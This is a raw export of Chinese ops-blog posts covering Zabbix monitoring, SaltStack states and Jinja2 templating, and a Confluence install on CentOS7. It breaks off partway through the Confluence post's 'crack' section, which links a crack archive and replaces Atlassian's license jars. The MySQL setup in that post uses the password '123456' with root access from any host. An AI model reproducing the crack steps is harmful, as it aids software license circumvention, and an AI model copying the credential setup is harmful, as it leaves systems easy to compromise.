-- 添加(5) 触发器：创建触发器 名称：登陆用户数量大于3 表达式： 监控项：添加 -- 选择对应的群组与主机模板名称 功能：选择&quot;最新的T值&gt;N&quot; N: 输入3 严重性：选择“严重” 勾选启用 -- 添加(6) 图形：创建图形 名称：登陆用户数量 图形类别：正常 查看图例：勾选 查看触发器：勾选 监控项：添加 -- 勾选我们创建好的监控项 注：此处可以添加多个监控项，这样的话就可以实现多个监控放在一张图上 (7) 在对应主机配置中添加模板 添加模板 -- 更新 (8) Web查看监控值和主机图形数据 聚合图形检测中 – 聚合图形 – 所有聚合图形 – 新建聚合图形 1231.名称：全网监控流量图 -- 列数：2 -- 行：2 注：行和列可以再添加2. 所有聚合图形，找到并点击最后的“构造函数” -- 更改 -- 添加对应的图形即可 幻灯片播放123456检测中 -- 聚合图形 -- 所有聚合图形 -- 幻灯片播放 - 新建幻灯片播放名称：监控大盘 默认延迟：30s幻灯片：添加 -- 添加聚合图形 -- 全选 -- 选择 -- 添加作用：多个聚合图形可以自动滚动播放，如果有条件可以投放在大屏幕观看。 zabbix主机信息-导入导出12345配置 -- 模板 -- 选择模板 -- 导出配置 -- 模板 -- 选择模板 -- 导入官方模板：https:&#x2F;&#x2F;share.zabbix.com&#x2F;张耀GitHub：https:&#x2F;&#x2F;github.com&#x2F;zhangyao8&#x2F;zabbix-community-repos 自动发现与自动注册12自动发现：服务端发现客户端自动注册: 客户端主动到服务器登记 配置 – 自动发现 123456789101112131. 确保客户端agent配置文件 Server&#x3D;192.168.56.612. 配置 -- 自动发现名称：Local networkIP范围：172.16.1.1-10（从哪个地址进行搜索）延迟:3600(秒)检查：服务器通过zabbix_get命令获取客户端的system.uname值来检测是否存活设备唯一性准则： 根据情况选择已启用：勾选 -- 更新查看自动发现：检测中 -- 自动发现 123456789101112配置 -- 动作 -- 事件源：自动发现 -- 创建动作(编辑现有配置即可)名称：auto find 勾选已启用条件：无需修改 操作(更新)： 添加主机 添加主机到群组 链接到模板 启用主机 配置自动注册(注：需要关闭自动发现的动作,不能同时存在) 1234567891011121314配置客户端zabbix_agentd.confServer&#x3D;172.16.1.61ServerActive&#x3D;127.0.0.1改为ServerActive&#x3D;172.16.1.62 #被动改为主动Hostname&#x3D;Zabbix server 改为 Hostname&#x3D;web01&#x2F;etc&#x2F;init.d&#x2F;zabbix-agent restart #重启客户端配置 -- 动作(事件源：自动注册)-创建动作名称：自动注册新的触发条件： 主机元数据 似 Linux操作： 添加主机 添加主机到群组 链接到模板 grafana-zabbix1官方GitHub: https:&#x2F;&#x2F;github.com&#x2F;alexanderzobnin&#x2F;grafana-zabbix","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"编译安装zabbix","slug":"编译安装zabbix","permalink":"https://garywu520.github.io/tags/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85zabbix/"},{"name":"自定义脚本监控","slug":"自定义脚本监控","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E7%9B%91%E6%8E%A7/"}]},{"title":"saltstack-jinja2模板-进阶3","slug":"saltstack-jinja2模板-进阶3","date":"2017-10-19T08:28:18.000Z","updated":"2017-10-19T10:30:16.672Z","comments":true,"path":"2017/10/19/saltstack-jinja2模板-进阶3/","link":"","permalink":"https://garywu520.github.io/2017/10/19/saltstack-jinja2%E6%A8%A1%E6%9D%BF-%E8%BF%9B%E9%98%B63/","excerpt":"什么是Jinja2 12Jinja2 是一个 Python 的功能齐全的模板引擎。它有完整的 unicode 支持，一个可选的集成沙箱执行环境，被广泛使用，以 BSD 许可证授权。","text":"什么是Jinja2 12Jinja2 是一个 Python 的功能齐全的模板引擎。它有完整的 unicode 支持，一个可选的集成沙箱执行环境，被广泛使用，以 BSD 许可证授权。 salt使用Jinja2模板 12345SaltStack 是使用YAML语言来将sls文件解释成它自己可以识别的内容，Jinja 是一种基于Python的模板引擎，在sls文件里可以直接使用 Jinja 模板来做一些操作。比如当我们需要对多台服务器做一些 Apache 服务配置时，由于每台服务器信息不一样（比如 IP 不同），如果为每台服务器去创建 SLS 文件就不太合理，而通过 Jinja 模板则可以用生成变量→读取变量的方式来为每个服务器设置应有的信息。 salt使用jinja2模板的三步骤 123456789101112131415161. 告诉file模块，要使用jinja2. 列出参数列表如下：apache-config: file.managed: - name: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf - source: salt:&#x2F;&#x2F;lamp&#x2F;files&#x2F;httpd.conf - user: root - group: root - mode: 644 - template: jinja # 1. 增加这行表示开启jinja模板 - defaults: # 2. 下面设定变量的值 PORT: 88 3. 文件中模板变量的引用 模板里面支持 salt&#x2F;grains&#x2F;pillar 进行变量赋值 Jinja2模板的基本使用12345678910111213141516171819202122232425261. 首先修改源文件中需要引用变量的内容。 比如: 只修改Apache的端口，需要修改httpd.conf文件中将Listen 80 为Listen &#123;&#123; PORT &#125;&#125;2. 对sls文件进行编辑以定义模板并且给变量赋值，vim apache-config.slsapache-config: file.managed: - name: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf - source: salt:&#x2F;&#x2F;files&#x2F;httpd.conf - user: root - group: root - mode: 644 - template: jinja - defaults: PORT: 8080 3. 执行salt命令：salt \\* state.sls apache-config 结果输出如下： ...... #Listen 12.34.56.78:80 -Listen 80 +Listen 8080 ...... 说明端口已经修改成功！ Jinja2模板的高级使用–监听 “IP:端口” 形式1在基本使用中由于修改的是端口，端口信息一般是固定的，如果想要修改的信息是每个 minion 自身的 IP 就没办法设置一个通用的信息了， 这个时候需要通过其他方法来获取 minion 相关信息，这里可以使用 Grains 、Pillar 和执行模块三个方法来获取。 用Grains举例 123456789101112131415161718192021222324251. 首先修改源文件中需要引用变量的内容。 比如: 只修改Apache的端口，需要修改httpd.conf文件中将Listen 80 为 Listen &#123;&#123; IPADDR &#125;&#125;:&#123;&#123; PORT &#125;&#125;2. 对sls文件进行编辑以定义模板并且给变量赋值，vim apache-config.slsapache-config: file.managed: - name: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf - source: salt:&#x2F;&#x2F;files&#x2F;httpd.conf - user: root - group: root - mode: 644 - template: jinja - defaults: PORT: 8080 IPADDR: &#123;&#123; grains[&#39;fqdn_ip4&#39;][0] &#125;&#125; 3. 执行salt命令：salt \\* state.sls apache-config ...... #Listen 12.34.56.78:80 -Listen 8080 +Listen 192.168.56.22:80 出现此类信息说明执行成功！ 12345上面的例子中： IPADDR: &#123;&#123; grains[&#39;fqdn_ip4&#39;][0] &#125;&#125;注：[fqdn_ip4]代表的是IP，该信息需要先执行 salt &#39;*&#39; grains.items 查询，由于grains查询输出的是列表，会有多个值，需要加上[0]代表取第一个值另外一点，所有minion节点需要修改&#x2F;etc&#x2F;hosts把本机IP地址与主机名正确对应填写，否则执行报错 附录：在master上查看minion的grains值1234567891011salt \\* grains.ls #列出grains的所有keysalt \\* grains.get app # 查看grains中的app信息salt \\* grains.get os #查看grains中的os信息salt \\* grains.get ipv4 #查看grains的ipv4信息salt \\* grains.get mem_total #查看grains中的总内存信息...... #只要是grains.ls所列出的项，均可以使用salt \\* grains.get命令获取salt \\* grains.items # 查看所有“树形列出”的grains信息salt &#39;*&#39; grains.item os # 获取操作系统名称salt &#39;*&#39; grains.item fqdn_ip4 #查看物理网卡IP地址salt \\* grains.setval hello world #在master上给minion设置grain键值对","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"jinja2","slug":"jinja2","permalink":"https://garywu520.github.io/tags/jinja2/"},{"name":"模板","slug":"模板","permalink":"https://garywu520.github.io/tags/%E6%A8%A1%E6%9D%BF/"}]},{"title":"saltstack进阶学习2","slug":"saltstack进阶学习2","date":"2017-10-18T03:55:10.000Z","updated":"2017-10-20T12:56:03.837Z","comments":true,"path":"2017/10/18/saltstack进阶学习2/","link":"","permalink":"https://garywu520.github.io/2017/10/18/saltstack%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A02/","excerpt":"salt执行模块 运行shell命令 1234567saltstack 支持在master上向client 远程执行命令，并显示命令执行的结果命令格式： salt &#39;&lt;操作目标&gt;&#39; &lt;方法&gt; [参数]#cmd.run可以执行所有shell命令salt \\* cmd.run &#39;w&#39; 在所有主机上执行w命令(注*号需要转义)","text":"salt执行模块 运行shell命令 1234567saltstack 支持在master上向client 远程执行命令，并显示命令执行的结果命令格式： salt &#39;&lt;操作目标&gt;&#39; &lt;方法&gt; [参数]#cmd.run可以执行所有shell命令salt \\* cmd.run &#39;w&#39; 在所有主机上执行w命令(注*号需要转义) 示例： 12345678910111213141516[root@CentOS-20 ~]# salt \\* cmd.run &quot;df -h&quot;CentOS-22: Filesystem Size Used Avail Use% Mounted on &#x2F;dev&#x2F;sda3 16G 1.6G 14G 11% &#x2F; tmpfs 931M 12K 931M 1% &#x2F;dev&#x2F;shm &#x2F;dev&#x2F;sda1 190M 51M 129M 29% &#x2F;bootCentOS6-21: Filesystem Size Used Avail Use% Mounted on &#x2F;dev&#x2F;sda3 16G 1.6G 14G 11% &#x2F; tmpfs 931M 12K 931M 1% &#x2F;dev&#x2F;shm &#x2F;dev&#x2F;sda1 190M 51M 129M 29% &#x2F;bootCentOS-20: Filesystem Size Used Avail Use% Mounted on &#x2F;dev&#x2F;sda3 16G 1.5G 14G 11% &#x2F; tmpfs 931M 16K 931M 1% &#x2F;dev&#x2F;shm &#x2F;dev&#x2F;sda1 190M 51M 129M 29% &#x2F;boot 状态模块1SaltStack使用现有的序列化系统来渲染sls数据。而这个现有的序列化系统就是YAML，而严格的YAML格式往往使现在正在学习SaltStack的同学屡屡掉坑。 YAML语法-参考 YAML语法规范 YAML文件格式-注意点 1231.务必使用空格缩进，第二个层级比第一个层级多2个空格,2、4、6、8以此类推。2. 每个层级使用冒号(:)表示结束3. 横杠(-)表示同层级列表 环境1234系统:CentOS6192.168.56.20 角色：salt-master&#x2F;salt-minion192.168.56.21 角色：salt-minion192.168.56.22 角色：salt-minion salt-master主配置文件-修改 1234567891011121314151617搜索“file_roots”快速定位到对应位置，添加如下：file_roots: base: #默认环境 - &#x2F;var&#x2F;salt&#x2F;base dev: - &#x2F;var&#x2F;salt&#x2F;dev #开发环境 test: - &#x2F;var&#x2F;salt&#x2F;test #测试环境 prod: - &#x2F;var&#x2F;salt&#x2F;prod #生产环境 作用：告诉salt-master去哪里查找状态模块文件,这里规划使用4个目录创建目录：mkdir -p &#x2F;var&#x2F;salt&#x2F;&#123;base,dev,test,prod&#125;重启：&#x2F;etc&#x2F;init.d&#x2F;salt-master restart查看salt-master日志：tailf &#x2F;var&#x2F;log&#x2F;salt&#x2F;master 软件安装—通过salt安装apache 1234567891011121314151617181920212223242526cd &#x2F;var&#x2F;salt&#x2F;base #进入salt状态模块目录cat apache.sls #这里以安装apache为例，创建状态模块文件，后缀为.slsapache-install: #声明一个ID（整个salt架构里唯一） pkg.installed: #pkg为状态模块；installed是方法 - name: httpd #该行表示installed的参数apache-service: #声明一个ID（整个salt架构里唯一） service.running: #service为状态模块；running是方法 - name: httpd #该行表示running的参数 - enable: True #该行表示running的参数 如上所示：所谓状态模块，首先检测apache是否已经安装，如果已经安装则跳过，否则将安装；后者为检测服务状态是否已经运行，运行则跳过否则将服务启动并添加为开机启动。 启动运行模块：salt \\* state.sls apache #在所有minion节点安装apache注：执行状态文件的时候，状态文件一定不能添加.sls后缀,否则会出现错误此时手动在192.168.56.22上面停止apache服务，再次在master上使用salt推送，观察输出结果[root@CentOS-22 ~]# &#x2F;etc&#x2F;init.d&#x2F;httpd stopsalt \\* state.sls apache 192.168.56.22的节点的执行结果是：首先判断是否已经安装apache,发现有则跳过；再次判断httpd服务是否启动，发现没有启动，则只进行启动服务。 12345678知识点-扩展：如上面我们执行salt命令：salt \\* state.sls apache 如果apache.sls状态模块文件不在当前目录，而在其他目录，如何在当前目录执行salt命令呢？cd &#x2F;var&#x2F;salt&#x2F;base #确保在当前目录mkdir web -p #在当前目录创建web子目录mv apache.sls web&#x2F; #剪切到web子目录下salt \\* state.sls web.apache #执行salt命令(注：最后是&quot;目录.状态文件&quot;) 123上面使用了state.sls 远程执行命令, state是模块，sls是state模块的一个方法[root@stack-master ~]# salt \\* state.sls web.apache 推送文件—编写批量更改dns的sls状态文件 123456789101112131415161718192021222324(1)首先定义好resolv.conf配置文件并放到&#x2F;var&#x2F;salt&#x2F;base&#x2F;files&#x2F;目录下(2)创建dns.sls配置文件[root@CentOS-20 base]# cd &#x2F;var&#x2F;salt&#x2F;base[root@CentOS-20 base]# cat dns.sls dns-config: file.managed: - name: &#x2F;etc&#x2F;resolv.conf #文件目标存放目录 - source: salt:&#x2F;&#x2F;files&#x2F;resolv.conf - user: root #修改属主 - group: root #修改属组 - mode: 644 #修改权限 注：其中“salt:&#x2F;&#x2F;files&#x2F;resolv.conf”指文件本地存放目录,而&quot;salt:&#x2F;&#x2F;&quot;表示master配置文件中指定的开发环境根路径(3)执行 [root@CentOS-20 base]# cd &#x2F;var&#x2F;salt&#x2F;base salt \\* state.sls dns #执行dns状态模块文件 [root@CentOS-22 ~]# cat &#x2F;etc&#x2F;resolv.conf #检查 # Generated by NetworkManager nameserver 114.114.114.114 nameserver 223.5.5.5 nameserver 8.8.8.8 state模块-介绍1state模块是saltstack配置管理的核心内容，需要熟练掌握如下几个组件以及常用的方法，以后会常用。 file - 管理文件状态 1234567常用方法：file.managed：保证&quot;文件&quot;存在并且为对应的状态，不一样就根据source指定文件进行修改。file.recurse: 保证&quot;目录&quot;存在并且为对应状态，否则change。file.absent：确保&quot;文件不存在&quot;，如果存在就删除。具体参考：https:&#x2F;&#x2F;docs.saltstack.com&#x2F;en&#x2F;latest&#x2F;ref&#x2F;states&#x2F;all&#x2F;salt.states.file.html#module-salt.states.file 1234567891011121314151617递归管理整个目录--举例：[root@linux-node1 web]# pwd&#x2F;var&#x2F;salt&#x2F;base&#x2F;[root@linux-node1 web]# cat lamp.sls apache-conf: file.recurse: - name: &#x2F;etc&#x2F;httpd&#x2F;conf.d - source: salt:&#x2F;&#x2F;files&#x2F;apache-conf.d mkdir &#x2F;var&#x2F;salt&#x2F;files&#x2F;apache-conf.d[root@linux-node1 ~]# cd &#x2F;var&#x2F;salt&#x2F;files&#x2F;apache-conf.d&#x2F;[root@linux-node1 apache-conf.d]# cp -a &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;* .执行：salt \\* state.sls lamp 1234567891011121314151617举例：apache-conf: file.managed: - name: &#x2F;etc&#x2F;http&#x2F;conf&#x2F;http.conf - source: salt:&#x2F;&#x2F;apache&#x2F;http.conf - user: root - group: root - mode: 644 - template: jinja - defaults: custom_var: &quot;default value&quot; other_var: 123&#123;% if grains[&#39;os&#39;] &#x3D;&#x3D; &#39;Ubuntu&#39; %&#125; - context: custom_var: &quot;override&quot;&#123;% endif %&#125; 123456789&#x2F;etc&#x2F;foo.conf: file.managed: - source: - salt:&#x2F;&#x2F;foo.conf.&#123;&#123; grains[&#39;fqdn&#39;] &#125;&#125; - salt:&#x2F;&#x2F;foo.conf.fallback - user: foo - group: users - mode: 644 - backup: minion pkg - 管理软件包状态 1234567常用方法：pkg.installed： 确保软件包已经安装，如果没有安装就安装。pkg.remove： 确保软件包已卸载，如果还是安装的，就卸载。pkg.purge： 除remove外，还会删除其配置文件。pkg.latest： 确保软件包是最近版本，如果不是就升级。更多参考：https:&#x2F;&#x2F;docs.saltstack.com&#x2F;en&#x2F;latest&#x2F;ref&#x2F;states&#x2F;all&#x2F;salt.states.pkg.html#module-salt.states.pkg 12345678910举例：apache-install: pkg.installed: - name: httpdapache-service: service.running: - name: httpd - enable: True 12345678910111213141516举例：[root@linux-node1 web]# pwd&#x2F;srv&#x2F;salt&#x2F;base&#x2F;web[root@linux-node1 web]# [root@linux-node1 web]# cat lamp.sls apache-conf: file.recurse: - name: &#x2F;etc&#x2F;httpd&#x2F;conf.d - source: salt:&#x2F;&#x2F;web&#x2F;files&#x2F;apache-conf.d mkdir &#x2F;srv&#x2F;salt&#x2F;base&#x2F;web&#x2F;files&#x2F;apache-conf.d[root@linux-node1 ~]# cd &#x2F;srv&#x2F;salt&#x2F;base&#x2F;web&#x2F;files&#x2F;apache-conf.d&#x2F;[root@linux-node1 apache-conf.d]# cp -a &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;* .执行：salt \\* state.highstate service - 管理服务状态 12345常用方法：service.running: 确保服务处理运行状态，如果没有运行就启动。service.dead： 确保服务没有在运行，如果运行就停止。service.enabled： 设置服务保持开机启动。False或Trueservice.disabled： 设置服务不开机启动。 12345678举例：redis: service.running: - enable: True - reload: True - watch: - pkg: redis cmd 远程执行命令 123saltstack 支持在master上向client 远程执行命令，并显示命令执行的结果命令格式：salt &#39;&lt;操作目标&gt;&#39; &lt;方法&gt; [参数] 123示例：使用cmd.run远程执行命令, cmd是模块，run是cmd模块的一个方法[root@stack-master ~]# salt &#39;*&#39; cmd.run &quot;free -m&quot; 针对“操作目标” 进行进行过滤 1有时候需要针对远程minion主机进行过滤，如何进行精确匹配呢？ 1234普通匹配：匹配所有 &#39;*&#39;匹配单个 &#39;minion_id&#39; #minion_id即为Python通过IP地址获取到的主机名称 1234567891011(1)正则匹配： 使用-E ，--pcre 进行正则匹配 例如：[root@stack-master ~]# salt -E &#39;^CentOS*&#39; cmd.run &quot;uptime&quot;(2)IP匹配： -S，--ipcidr,根据被控主机的IP地址或IP子网进行匹配 [root@stack-master ~]# salt -S 192.168.56.0&#x2F;24 cmd.run &quot;free -m&quot;(3)列表匹配 -L，--list,以主机id名列表的形式进行过滤，格式与Python的列表相似，即不同主机id 名称使用逗号分隔 [root@stack-master ~]# salt -L &#39;stack-node01,stack-node02&#39; cmd.run &quot;free -m&quot; 实例：1要求：给网站web添加认证 1234567891011(1)准备并配置httpd.conf文件, 并放在&#x2F;var&#x2F;salt&#x2F;base&#x2F;files目录下&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&quot;&gt; AllowOverride All Order allow,deny Allow from All AuthUserFile &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;htpasswd_file AuthName &quot;hehe&quot; AuthType Basic Require user admin&lt;&#x2F;Directory&gt; 12345678910111213(2)编辑配置状态文件vim apache_auth_config.slsapache-auth: pkg.installed: - name: httpd-tools cmd.run: - name: htpasswd -bc &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;htpasswd_file admin admin - unless: test -f &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;htpasswd_file - require: - pkg: apache-auth #使用require来声明执行顺序：如果apache-auth执行失败，则不执行cmd.run 12(3) 执行salt \\* state.sls apache_auth_config top.sls 也许你已经发现了，上面我们去执行状态模块文件的方式都是逐一去执行的。那么能否将所有状态模块文件一块执行呢？答案是肯定的 1top.sls 是配置管理的入口文件，一切都是从这里开始，在master 主机上，默认存放在&#x2F;srv&#x2F;salt&#x2F;目录,而我已将其定义在了&#x2F;var&#x2F;salt目录。 top.sls 文件格式 12345678910111213141516#可以通过正则进行匹配base: &#39;*&#39;: - webserver #可以通过分组名进行匹配，必须要有 - match: nodegroupbase: group1: - match: nodegroup - webserver #也可以通过grain模块匹配，必须要有- match: grainbase: &#39;os:Fedora&#39;: - match: grain - webserver 编辑top.sls 12345678cd &#x2F;var&#x2F;salt&#x2F;base[root@CentOS-20 base]# cat top.sls #编辑top.slsbase: &#39;*&#39;: - apache - dns 注：我上面的top.sls内容配置需要与apache.sls和dns.sls在同一目录 1234567测试salt &#39;*&#39; state.highstatesalt &#39;*&#39; state.highstate topsalt &#39;*&#39; state.highstate -v test&#x3D;True #测试执行使用命令调用top.sls文件执行即可注：这里必须使用highstate（高水平的state） 向文件追加内容1234567891011121314151617cd &#x2F;var&#x2F;salt&#x2F;base[root@CentOS-20 base]# cat append.sls #创建追加文件&#x2F;etc&#x2F;profile: file.append: - text: #注意:这里是text，不是test不是test不是test！ - &quot;#aaa&quot;#执行命令salt \\* state.sls append #minion检查结果[root@CentOS6-21 ~]# tail &#x2F;etc&#x2F;profile alias grep&#x3D;&#39;grep --color&#x3D;auto&#39;alias ll&#x3D;&#39;ls -l --color&#x3D;auto --time-style&#x3D;long-iso&#39;#aaa state的逻辑关系列表及示例12345match: 配模某个模块，比如 match: grain match: nodegrouprequire：依赖某个state，在运行此state前，先运行依赖的state，依赖可以有多个watch： 在某个state变化时运行此模块order： 优先级比require和watch低，有order指定的state比没有order指定的优先级高 state的逻辑关系 require: 依赖某个state，在运行此state前，先运行依赖的state，依赖可以有多个 12345678910httpd: # maps to &quot;name&quot; pkg: - installed file: - managed: - name: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf - source: salt:&#x2F;&#x2F;httpd&#x2F;httpd.conf - require: #若pkg执行失败则不执行file - pkg: httpd watch: 在某个state变化时运行此模块，watch除具备require功能外，还增了关注状态的功能 123456789101112131415redis: pkg: - latest file.managed: - name: &#x2F;etc&#x2F;redis.conf - source: salt:&#x2F;&#x2F;redis&#x2F;redis.conf - require: - pkg: redis service.running: - enable: True - watch: - file: &#x2F;etc&#x2F;redis.conf - pkg: redis order 优先级比require和watch低，有order指定的state比没有order指定的优先级高 123vim: pkg.installed: - order: 1","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"salt命令格式","slug":"salt命令格式","permalink":"https://garywu520.github.io/tags/salt%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F/"},{"name":"salt执行模块","slug":"salt执行模块","permalink":"https://garywu520.github.io/tags/salt%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9D%97/"},{"name":"salt状态模块","slug":"salt状态模块","permalink":"https://garywu520.github.io/tags/salt%E7%8A%B6%E6%80%81%E6%A8%A1%E5%9D%97/"},{"name":"YAML格式规范","slug":"YAML格式规范","permalink":"https://garywu520.github.io/tags/YAML%E6%A0%BC%E5%BC%8F%E8%A7%84%E8%8C%83/"},{"name":"cmd.run","slug":"cmd-run","permalink":"https://garywu520.github.io/tags/cmd-run/"},{"name":"top.sls","slug":"top-sls","permalink":"https://garywu520.github.io/tags/top-sls/"},{"name":"require","slug":"require","permalink":"https://garywu520.github.io/tags/require/"},{"name":"watch","slug":"watch","permalink":"https://garywu520.github.io/tags/watch/"},{"name":"sls","slug":"sls","permalink":"https://garywu520.github.io/tags/sls/"}]},{"title":"CentOS7 安装及破解confluence","slug":"CentOS7-安装及破解confluence","date":"2017-10-17T03:00:27.000Z","updated":"2017-10-17T08:08:01.615Z","comments":true,"path":"2017/10/17/CentOS7-安装及破解confluence/","link":"","permalink":"https://garywu520.github.io/2017/10/17/CentOS7-%E5%AE%89%E8%A3%85%E5%8F%8A%E7%A0%B4%E8%A7%A3confluence/","excerpt":"confluence是什么？ 1简单说：它是一款卓越的团队协作软件,改变了现代团队的工作方式","text":"confluence是什么？ 1简单说：它是一款卓越的团队协作软件,改变了现代团队的工作方式 环境准备 安装配置Java 1234567891011121314151617181920212223官方：http:&#x2F;&#x2F;www.oracle.com&#x2F;technetwork&#x2F;cn&#x2F;java&#x2F;javase&#x2F;downloads&#x2F;jdk8-downloads-2133151-zhs.html(1)下载jdk-8u144-linux-x64.tar.gz二进制包wget http:&#x2F;&#x2F;download.oracle.com&#x2F;otn-pub&#x2F;java&#x2F;jdk&#x2F;8u144-b01&#x2F;090f390dda5b47b9b721c7dfaa008135&#x2F;jdk-8u144-linux-x64.tar.gz?AuthParam&#x3D;1508210153_b10ed029a2d26362f2bc3c77cd760dc4(2)解压至&#x2F;usr&#x2F;local&#x2F;web目录 mkdir &#x2F;usr&#x2F;local&#x2F;web -p tar -xf jdk-8u144-linux-x64.tar.gz mv jdk1.8.0_144 &#x2F;usr&#x2F;local&#x2F;web&#x2F;(3)配置环境变量JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;web&#x2F;jdk1.8.0_144PATH&#x3D;$JAVA_HOME&#x2F;bin:$PATH:.CLASSPATH&#x3D;$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar:.export JAVA_HOMEexport PATHexport CLASSPATH(4)查看java版本[root@localhost ~]# java -versionjava version &quot;1.8.0_144&quot;Java(TM) SE Runtime Environment (build 1.8.0_144-b01)Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode) 安装mysql-二进制 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748各版本下载源：http:&#x2F;&#x2F;mirrors.sohu.com&#x2F;mysql&#x2F;MySQL-5.6&#x2F; #不太好找的话搜索：“glibc2.5-x86_64”即可(1)下载mysql-5.6.35-linux-glibc2.5-x86_64.tar.gz http:&#x2F;&#x2F;mirrors.sohu.com&#x2F;mysql&#x2F;MySQL-5.6&#x2F;mysql-5.6.35-linux-glibc2.5-x86_64.tar.gz?crazycache&#x3D;1 (2) 添加mysql程序运行时的管理用户 useradd -s &#x2F;sbin&#x2F;nologin -M mysql (3)将解压后的程序目录放到&#x2F;usr&#x2F;local&#x2F;web目录，并进行软链为mysql tar -zxvf mysql-5.6.35-linux-glibc2.5-x86_64.tar.gz mv mysql-5.6.35-linux-glibc2.5-x86_64 &#x2F;usr&#x2F;local&#x2F;web&#x2F; cd &#x2F;usr&#x2F;local&#x2F;web ln -s mysql-5.6.35-linux-glibc2.5-x86_64 mysql (4)修改权限 cd mysql &amp;&amp; chown -R mysql.mysql data (5)初始化数据库 &#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;scripts&#x2F;mysql_install_db --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;data --user&#x3D;mysql (6)拷贝脚本文件到&#x2F;etc&#x2F;init.d&#x2F;目录 cp &#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysqld ll &#x2F;etc&#x2F;init.d&#x2F;mysqld (7) 修改启动脚本和mysql命令的路径（默认&#x2F;usr&#x2F;local&#x2F;目录下） sed -i &#39;s#&#x2F;usr&#x2F;local&#x2F;mysql#&#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql#g&#39; &#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;bin&#x2F;mysqld_safe &#x2F;etc&#x2F;init.d&#x2F;mysqld (8) 复制默认配置文件 \\cp &#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnf (9) 启动mysql并配置开机自启 &#x2F;etc&#x2F;init.d&#x2F;mysqld start chkconfig --add mysqld chkconfig mysqld on chkconfig --list (10)配置mysql环境变量 echo &#39;export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;bin:$PATH&#39; &gt;&gt;&#x2F;etc&#x2F;profile source &#x2F;etc&#x2F;profile which mysql(11)设置密码 &#x2F;usr&#x2F;local&#x2F;web&#x2F;mysql&#x2F;bin&#x2F;mysqladmin -u root password &#39;123456&#39; mysql -uroot -p (12)创建名为confluence的数据库并赋权 create database confluence default character set utf8 collate utf8_bin; grant all on &#96;confluence&#96;.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39;; flush privileges; 下载安装confluence5.6.6 12345678910111213141516官方下载：https:&#x2F;&#x2F;www.atlassian.com&#x2F;software&#x2F;confluence&#x2F;download-archives下载：atlassian-confluence-5.6.6-x64.bin(1)添加权限： chmod 755 atlassian-confluence-5.6.6-x64.bin(2)执行bin来安装 .&#x2F;atlassian-confluence-5.6.6-x64.bin 根据提示指定安装目录、端口等信息 Confluence 安装目录&#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence Confluence data目录: &#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence_data HTTP: 8090, Control: 8000 (3)安装后的信息 (1)修改端口：vim &#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence&#x2F;conf&#x2F;server.xml (2)wiki 默认端口是8090 需要在防火墙开放8090端口 破解confluence 12345678910111213141516171819202122232425(1)停止confluence服务 &#x2F;etc&#x2F;init.d&#x2F;confluence stop(2)下载破解程序 confluence5.6.6-crack.zip 百度云：https:&#x2F;&#x2F;yun.baidu.com&#x2F;s&#x2F;1o88rrIU(3)删除confluence程序目录下的6个jar包 cd &#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence&#x2F;confluence&#x2F;WEB-INF&#x2F;lib 要删除的6个jar包名称分别为： atlassian-extras-api-3.2.jar atlassian-extras-common-3.2.jar atlassian-extras-core-3.2.jar atlassian-extras-decoder-api-3.2.jar atlassian-extras-decoder-v2-3.2.jar atlassian-extras-legacy-3.2.jar 为避免不必要的麻烦，把这6个jar文件移动到该目录新建的bak目录下 (4)解压破解程序，把jar子目录里面的三个jar包，放到&#x2F;usr&#x2F;local&#x2F;web&#x2F;confluence&#x2F;confluence&#x2F;confluence&#x2F;WEB-INF&#x2F;lib目录下 cp atlassian-extras-3.2.jar 